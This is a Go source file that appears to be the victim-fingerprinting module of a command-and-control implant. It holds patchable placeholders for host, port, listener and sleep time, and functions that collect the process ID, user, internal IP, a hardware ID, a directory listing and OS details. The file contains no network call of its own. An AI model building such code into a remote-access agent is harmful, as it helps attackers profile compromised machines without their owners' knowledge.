package PcInfo

import (
	"bufio"
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strconv"
	"strings"
)

var RemarkContext string = ""
var RemarkColor string = ""
var GroupInfo string = "Linux"
var Host string = ""
var Port string = ""
var ListenerName string = ""
var SleepTime string = "SleepAAAABBBBCCCCDDDD"

func GetProcessID() string {
	return strconv.Itoa(os.Getpid())
}

func GetProcessName() string {
	return os.Args[0]
}

func GetHWID() string {
	data := fmt.Sprintf("%d%s%s%d", runtime.NumCPU(), os.Getenv("USER"), runtime.GOOS, 0)
	hasher := md5.New()
	hasher.Write([]byte(data))
	return strings.ToUpper(hex.EncodeToString(hasher.Sum(nil))[:20])
}

func GetInternalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}

	for _, address := range addrs {
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}

	return ""
}

func GetCurrentUser() string {
	usr, err := user.Current()
	if err != nil {
		return ""
	}

	return usr.Username
}

func ListFiles() string {
	files, err := ioutil.ReadDir(".")
	if err != nil {
		log.Fatal(err)
	}

	var infoStrings []string
	infoStrings = append(infoStrings, fmt.Sprintf("%-15s %-10s %-20s %-25s", "Name", "Size", "Mode", "ModTime"))
	infoStrings = append(infoStrings, "-------------------------------------------------------------------------------------")

	for _, file := range files {
		infoStrings = append(infoStrings, fmt.Sprintf("%-15s %-10d %-20s %-25s", file.Name(), file.Size(), file.Mode(), file.ModTime()))
	}

	return strings.Join(infoStrings, "\n")
}

func GetCurrentDirectory() string {
	dir, err := os.Getwd()
	if err != nil {
		//fmt.Println("Error: ", err)
		return ""
	}
	return dir
}

func GetOSVersion() string {
	switch runtime.GOOS {
	case "windows":
		return getWindowsVersion()
	case "darwin":
		return getMacOSVersion()
	default:
		return getLinuxVersion()
	}
}

func getWindowsVersion() string {

	return "Windows"
}

func getLinuxVersion() string {
	var osName, osVersion string

	// 尝试读取 /etc/os-release
	file, err := os.Open("/etc/os-release")
	if err == nil {
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := scanner.Text()
			splitted := strings.SplitN(line, "=", 2)
			if len(splitted) == 2 {
				value := strings.Trim(splitted[1], "\"")
				switch splitted[0] {
				case "NAME":
					osName = value
				case "VERSION_ID":
					osVersion = value
				}
			}
		}
	} else {
		// /etc/os-release 不存在，尝试读取 /etc/lsb-release
		data, err := ioutil.ReadFile("/etc/lsb-release")
		if err == nil {
			lines := strings.Split(string(data), "\n")
			for _, line := range lines {
				splitted := strings.SplitN(line, "=", 2)
				if len(splitted) == 2 {
					value := splitted[1]
					switch splitted[0] {
					case "DISTRIB_ID":
						osName = value
					case "DISTRIB_RELEASE":
						osVersion = value
					}
				}
			}
		}
	}

	if osName == "" || osVersion == "" {
		return ""
	}

	data, err := ioutil.ReadFile("/proc/sys/kernel/osrelease")
	if err != nil {
		return ""
	}

	return fmt.Sprintf("%s %s && Kernel: %s", osName, osVersion, data)
}

func getMacOSVersion() string {
	cmd := exec.Command("sw_vers")
	output, err := cmd.Output()
	if err != nil {
		return ""
	}

	var osName, osVersion string
	scanner := bufio.NewScanner(strings.NewReader(string(output)))
	for scanner.Scan() {
		line := scanner.Text()
		splitted := strings.SplitN(line, ":", 2)
		if len(splitted) == 2 {
			key := strings.TrimSpace(splitted[0])
			value := strings.TrimSpace(splitted[1])

			switch key {
			case "ProductName":
				osName = value
			case "ProductVersion":
				osVersion = value
			}
		}
	}

	if osName == "" || osVersion == "" {
		return ""
	}

	return fmt.Sprintf("%s %s", osName, osVersion)
}
